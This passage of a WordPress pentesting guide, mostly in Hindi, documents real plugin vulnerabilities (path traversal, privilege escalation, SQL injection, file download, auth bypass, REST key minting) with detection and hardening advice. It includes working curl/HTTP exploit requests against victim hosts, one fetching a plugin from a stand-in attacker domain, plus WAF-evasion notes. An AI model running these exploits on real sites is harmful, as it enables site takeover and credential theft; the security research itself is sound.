curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Detection checklist

* рдХреЛрдИ рднреА `add_action( 'wp_ajax_nopriv_...')` callback рдЬреЛ filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, рдЖрджрд┐) рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред
* paths рдореЗрдВ unsanitised user input рдХрд╛ concatenation (рджреЗрдЦреЗрдВ `$_POST`, `$_GET`, `$_REQUEST`)ред
* `check_ajax_referer()` рдФрд░ `current_user_can()`/`is_user_logged_in()` рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ред

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (тЙд 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
рдпрд╣ рдХреНрдпреЛрдВ exploitable рд╣реИ

- рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рдмрд┐рдирд╛ `$_REQUEST['reset-for']` рдФрд░ рдПрдХ plugin рд╡рд┐рдХрд▓реНрдк рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИред
- рдпрджрд┐ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ `_asenha_view_admin_as_original_roles` рдореЗрдВ higher privileges рд╕рдВрдЧреНрд░рд╣реАрдд рдереЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ downgraded рдХрд┐рдпрд╛ рдЧрдпрд╛, рддреЛ рд╡реЗ reset path рдХреЛ рд╣рд┐рдЯ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ restore рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- рдХреБрдЫ deployments рдореЗрдВ, рдХреЛрдИ рднреА authenticated user `viewing_admin_as_role_are` рдореЗрдВ рдЕрднреА рднреА рдореМрдЬреВрдж рдХрд┐рд╕реА рдЕрдиреНрдп username рдХреЗ рд▓рд┐рдП reset рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (broken authorization).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively escalating privileges.

Detection checklist

- Look for role-switching features that persist тАЬoriginal rolesтАЭ in user meta (e.g., `_asenha_view_admin_as_original_roles`).
- Identify reset/restore paths that:
- Read usernames from `$_REQUEST` / `$_GET` / `$_POST`.
- Modify roles via `add_role()` / `remove_role()` without `current_user_can()` and `wp_verify_nonce()` / `check_admin_referer()`.
- Authorize based on a plugin option array (e.g., `viewing_admin_as_role_are`) instead of the actorтАЩs capabilities.

---

### Unauthenticated privilege escalation via cookieтАСtrusted user switching on public init (Service Finder тАЬsf-bookingтАЭ)

Some plugins wire user-switching helpers to the public `init` hook and derive identity from a client-controlled cookie. If the code calls `wp_set_auth_cookie()` without verifying authentication, capability and a valid nonce, any unauthenticated visitor can force login as an arbitrary user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings тЙд 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ЁЯФе sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
рдпрд╣ рд╢реЛрд╖рдгреАрдп рдХреНрдпреЛрдВ рд╣реИ

- рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ `init` hook рд╣реИрдВрдбрд▓рд░ рдХреЛ рдЕрдирдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рдмрдирд╛рддрд╛ рд╣реИ (рдХреЛрдИ `is_user_logged_in()` рдЧрд╛рд░реНрдб рдирд╣реАрдВ)ред
- рдкрд╣рдЪрд╛рди рдХреНрд▓рд╛рдЗрдВрдЯ-рдкрд░рд┐рд╡рд░реНрддрдиреАрдп cookie (`original_user_id`) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреА рд╣реИред
- `wp_set_auth_cookie($uid)` рдХреЛ рд╕реАрдзреЗ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдЙрд╕ рдпреВрдЬрд░ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА capability/nonce checks рдХреЗред

рд╢реЛрд╖рдг (рдЕрдирдкреНрд░рдорд╛рдгрд┐рдд)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF рд╡рд┐рдЪрд╛рд░ тАФ WordPress/plugin CVEs рдХреЗ рд▓рд┐рдП

Generic edge/server WAFs рд╡реНрдпрд╛рдкрдХ рдкреИрдЯрд░реНрди (SQLi, XSS, LFI) рдХреЗ рд▓рд┐рдП рдЕрдиреБрдХреВрд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдХрдИ highтАСimpact WordPress/plugin рджреЛрд╖ application-specific logic/auth рдмрдЧ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рддрдм рддрдХ рд╕рд╛рдорд╛рдиреНрдп рдЯреНрд░реИрдлрд┐рдХ рдХреА рддрд░рд╣ рджрд┐рдЦрддреЗ рд╣реИрдВ рдЬрдм рддрдХ engine WordPress routes рдФрд░ plugin semantics рдХреЛ рд╕рдордЭ рдирд╣реАрдВ рд▓реЗрддрд╛ред

Offensive notes

- clean payloads рдХреЗ рд╕рд╛рде plugin-specific endpoints рдХреЛ рдЯрд╛рд░реНрдЧреЗрдЯ рдХрд░реЗрдВ: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- рдкрд╣рд▓реЗ unauth paths рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads рдЕрдХреНрд╕рд░ рдмрд┐рдирд╛ obfuscation рдХреЗ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВред
- рдЖрдо high-impact рдорд╛рдорд▓реЛрдВ рдореЗрдВ: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- plugin CVEs рдХреА рд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП generic WAF signatures рдкрд░ рднрд░реЛрд╕рд╛ рди рдХрд░реЗрдВред application-layer, vulnerability-specific virtual patches рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдпрд╛ рдЬрд▓реНрджреА рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред
- code рдореЗрдВ negative regex filters рдХреА рдмрдЬрд╛рдп positive-security checks (capabilities, nonces, strict input validation) рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВред

## WordPress рд╕реБрд░рдХреНрд╖рд╛

### рдирд┐рдпрдорд┐рдд рдЕрдкрдбреЗрдЯ

рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ WordPress, plugins, рдФрд░ themes рдЕрдкрдбреЗрдЯреЗрдб рд╣реИрдВред рд╕рд╛рде рд╣реА рдкреБрд╖реНрдЯрд┐ рдХрд░реЗрдВ рдХрд┐ automated updating wp-config.php рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
рд╕рд╛рде рд╣реА, **рдХреЗрд╡рд▓ рднрд░реЛрд╕реЗрдордВрдж WordPress plugins рдФрд░ themes рд╣реА рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ**ред

### рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд▓рдЧрдЗрдиреНрд╕

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **рдЕрдиреНрдп рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ**

- рдбрд┐рдлрд╝реЙрд▓реНрдЯ **admin** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣рдЯрд╛рдПрдБ
- **рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб** рдФрд░ **2FA** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
- рд╕рдордп-рд╕рдордп рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА **permissions** рдХреА **рд╕рдореАрдХреНрд╖рд╛** рдХрд░реЗрдВ
- **рд▓реЙрдЧрд┐рди рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ** рддрд╛рдХрд┐ Brute Force attacks рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗ
- Rename **`wp-admin.php`** file рдФрд░ рдХреЗрд╡рд▓ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рдпрд╛ рдХреБрдЫ рдирд┐рд╢реНрдЪрд┐рдд IP addresses рд╕реЗ рд╣реА рдПрдХреНрд╕реЗрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВред

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin exposed a **savecategory** task that ultimately executes the following vulnerable code inside `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat тЬЧ
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **рд╕реИрдирд┐рдЯрд╛рдЗрдЬрд╝ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ** тАУ `parentid` рд╕реАрдзреЗ HTTP request рд╕реЗ рдЖрддрд╛ рд╣реИ.
2. **WHERE clause рдХреЗ рдЕрдВрджрд░ string concatenation** тАУ рдХреЛрдИ `is_numeric()` / `esc_sql()` / prepared statement рдирд╣реАрдВ рд╣реИ.
3. **рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкрд╣реБрдБрдЪ** тАУ рд╣рд╛рд▓рд╛рдБрдХрд┐ action `admin-post.php` рдХреЗ рдЬрд╝рд░рд┐рдП execute рд╣реЛрддрд╛ рд╣реИ, рдЬрдЧрд╣ рдкрд░ рдореМрдЬреВрдж рдПрдХрдорд╛рддреНрд░ рдЪреЗрдХ **CSRF nonce** (`wp_verify_nonce()` ) рд╣реИ, рдЬрд┐рд╕реЗ рдХреЛрдИ рднреА visitor рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреЗрдЬ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╢реЙрд░реНрдЯрдХреЛрдб `[wpjobportal_my_resumes]` рдПрдореНрдмреЗрдб рдХрд░рддрд╛ рд╣реИ.

#### рд╢реЛрд╖рдг

1. рдПрдХ рдирдпрд╛ nonce рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ arbitrary SQL рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Response рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдП рдЧрдП query рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ SQLi рд╕рд╛рдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

рдПрдХ рдЕрдиреНрдп task, **downloadcustomfile**, рд╡рд┐рдЬрд╝рд┐рдЯрд░реНрд╕ рдХреЛ path traversal рдХреЗ рдЬрд░рд┐рдП рдбрд┐рд╕реНрдХ рдкрд░ рдореМрдЬреВрдж **рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓** рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ред рдХрдордЬреЛрд░ sink `modules/customfield/model.php::downloadCustomUploadedFile()` рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` attacker-controlled рд╣реИ рдФрд░ **without sanitisation** рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░ рд╕реЗ, рдПрдХрдорд╛рддреНрд░ gate рдПрдХ **CSRF nonce** рд╣реИ рдЬрд┐рд╕реЗ resume page рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
рд╕рд░реНрд╡рд░ `wp-config.php` рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ, leaking DB credentials and auth keys.

## рдЧреИрд░-рдкреНрд░рдорд╛рдгреАрдХреГрдд account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

рдХрдИ themes/plugins "social login" helpers admin-ajax.php рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ expose рдХрд░рддреЗ рд╣реИрдВред рдЕрдЧрд░ рдПрдХ unauthenticated AJAX action (wp_ajax_nopriv_...) provider data рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реЛрдиреЗ рдкрд░ client-supplied identifiers рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ wp_set_auth_cookie() рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рдкреВрд░рд╛ authentication bypass рдмрди рдЬрд╛рддрд╛ рд╣реИред

рд╕рд╛рдорд╛рдиреНрдп рджреЛрд╖рдкреВрд░реНрдг рдкреИрдЯрд░реНрди (рд╕рд░рд▓реАрдХреГрдд)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider тАУ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ЁЯФе logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
рдпрд╣ рдХреНрдпреЛрдВ exploitable рд╣реИ

- рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдкрд╣реБрдВрдЪ possible via admin-ajax.php (wp_ajax_nopriv_тАж action) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред
- state change рд╕реЗ рдкрд╣рд▓реЗ nonce/capability checks рдирд╣реАрдВ рд╣реИрдВред
- OAuth/OpenID provider verification рдЧрд╛рдпрдм рд╣реИ; default branch attacker input рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд▓реЗрддрд╛ рд╣реИред
- get_user_by('email', $_POST['id']) рдХреЗ рдмрд╛рдж wp_set_auth_cookie($uid) requester рдХреЛ рдХрд┐рд╕реА рднреА рдореМрдЬреВрджрд╛ email address рдХреЗ рд░реВрдк рдореЗрдВ authenticate рдХрд░ рджреЗрддрд╛ рд╣реИред

Exploitation (unauthenticated)

- рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдБ: attacker /wp-admin/admin-ajax.php рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХрд┐рд╕реА рдорд╛рдиреНрдп user email рдХреЛ рдЬрд╛рдирддрд╛/рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред
- provider рдХреЛ unsupported value рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ (рдпрд╛ рдЗрд╕реЗ рд╣рдЯрд╛рдПрдБ) рддрд╛рдХрд┐ default branch рд╣рд┐рдЯ рд╣реЛ рдФрд░ id=<victim_email> рдкрд╛рд╕ рдХрд░реЗрдВред
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 рдФрд░ JSON рдмреЙрдбреА рдЬреИрд╕реА {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП; рдЙрд╕рдХреЗ рдмрд╛рдж рдХреЗ рдЕрдиреБрд░реЛрдз рдкреНрд░рдорд╛рдгреАрдХреГрдд рд╣реЛрддреЗ рд╣реИрдВред

Finding the action name

- theme/plugin рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ add_action('wp_ajax_nopriv_...', '...') рдкрдВрдЬреАрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реЛрд╢рд▓ рд▓реЙрдЧрд┐рди рдХреЛрдб рдореЗрдВ (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs рдЬреЛ рдЕрдкреНрд░рдорд╛рдгреАрдХреГрдд POSTs рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ /wp-admin/admin-ajax.php рдкрд░ social-login action рдФрд░ id=<email> рдХреЗ рд╕рд╛рдеред
- 200 responses рдЬреЛ success JSON рдХреЗ рд╕рд╛рде рд╣реЛрдВ рдФрд░ рддреБрд░рдВрдд рдЙрд╕реА IP/User-Agent рд╕реЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдЯреНрд░реИрдлрд┐рдХ рд╕реЗ рдкрд╣рд▓реЗ рд╣реЛрдВред

Hardening

- рдХреНрд▓рд╛рдЗрдВрдЯ рдЗрдирдкреБрдЯ рд╕реЗ рдкрд╣рдЪрд╛рди рди рдмрдирд╛рдПрдВред рдХреЗрд╡рд▓ рдЙрдиреНрд╣реАрдВ emails/IDs рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ рдЬреЛ validated provider token/ID рд╕реЗ рдЖрдИ рд╣реЛрдВред
- CSRF nonces рдФрд░ capability checks рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд░рдЦреЗрдВ рднрд▓реЗ рд╣реА login helpers рдХреЗ рд▓рд┐рдП рд╣реЛрдВ; wp_ajax_nopriv_ рдХреЛ рддрдм рддрдХ register рдХрд░рдиреЗ рд╕реЗ рдмрдЪреЗрдВ рдЬрдм рддрдХ рдмрд┐рд▓реНрдХреБрд▓ рдЬрд░реВрд░реА рди рд╣реЛред
- OAuth/OIDC responses рдХреЛ server-side рдкрд░ validate рдФрд░ verify рдХрд░реЗрдВ; missing/invalid providers рдХреЛ reject рдХрд░реЗрдВ (POST id рдкрд░ fallback рдирд╣реАрдВ рдХрд░реЗрдВ)ред
- рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ social login рдХреЛ disable рдХрд░рдиреЗ рдпрд╛ edge рдкрд░ virtually patch рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ (vulnerable action рдХреЛ block рдХрд░реЗрдВ) рдЬрдм рддрдХ fix рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛ред

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers тЙд 1.0.82)

Some plugins expose REST endpoints that mint reusable тАЬconnection keysтАЭ or tokens without verifying the callerтАЩs capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions тЖТ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC тАУ рдПрдХ connection key mint рдХрд░реЗрдВ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# тЖТ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
рдХреНрдпреЛрдВ рдпрд╣ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рд╣реИ
- Sensitive REST route рдХреЗрд╡рд▓ рдХрдо-entropy рдкрд╣рдЪрд╛рди рдкреНрд░рдорд╛рдг (username) рдпрд╛ permission_callback рдХреЗ рдЕрднрд╛рд╡ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ
- рдХреЛрдИ capability enforcement рдирд╣реАрдВ; mint рдХрд┐рдпрд╛ рдЧрдпрд╛ key рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

Detection checklist
- Grep plugin code for register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- рдХреЛрдИ рднреА route рдЬреЛ request-supplied identity (username/email) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ tokens/keys рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЗрд╕реЗ authenticated user рдпрд╛ capability рд╕реЗ рдмрд╛рдБрдзреЗ
- рдРрд╕реЗ subsequent routes рджреЗрдЦреЗрдВ рдЬреЛ server-side capability checks рдХреЗ рдмрд┐рдирд╛ minted token/key рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ

Hardening
- рдХрд┐рд╕реА рднреА privileged REST route рдХреЗ рд▓рд┐рдП: permission_callback рдЖрд╡рд╢реНрдпрдХ рдХрд░реЗрдВ рдЬреЛ required capability рдХреЗ рд▓рд┐рдП current_user_can() рд▓рд╛рдЧреВ рдХрд░реЗ
- client-supplied identity рд╕реЗ long-lived keys mint рди рдХрд░реЗрдВ; рдЕрдЧрд░ рдЬрд╝рд░реВрд░рдд рд╣реЛ рддреЛ authentication рдХреЗ рдмрд╛рдж short-lived, user-bound tokens рдЬрд╛рд░реА рдХрд░реЗрдВ рдФрд░ рдЙрдкрдпреЛрдЧ рдкрд░ capabilities рдлрд┐рд░ рд╕реЗ рдЬрд╛рдБрдЪреЗрдВ
- caller рдХреЗ user context рдХреЛ validate рдХрд░реЗрдВ (wp_set_current_user рдЕрдХреЗрд▓рд╛ рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИ) рдФрд░ рдЙрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ рдЬрд╣рд╛рдБ !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse тЖТ unauthenticated arbitrary plugin installation (FunnelKit Automations тЙд 3.5.3)

Nonces CSRF рдХреЛ рд░реЛрдХрддреЗ рд╣реИрдВ, authorization рдХреЛ рдирд╣реАрдВред рдЕрдЧрд░ рдХреЛрдб nonce рдкрд╛рд╕ рд╣реЛрдирд╛ рдХреЛ green light рдорд╛рдирддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ privileged operations (e.g., install/activate plugins) рдХреЗ рд▓рд┐рдП capability checks рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ, рддреЛ рдЕрдирдкреНрд░рдорд╛рдгрд┐рдд рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдХрдордЬреЛрд░ nonce requirement рдкреВрд░рд╛ рдХрд░рдХреЗ backdoored рдпрд╛ vulnerable plugin рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдХреЗ RCE рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce тАЬpassesтАЭ
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
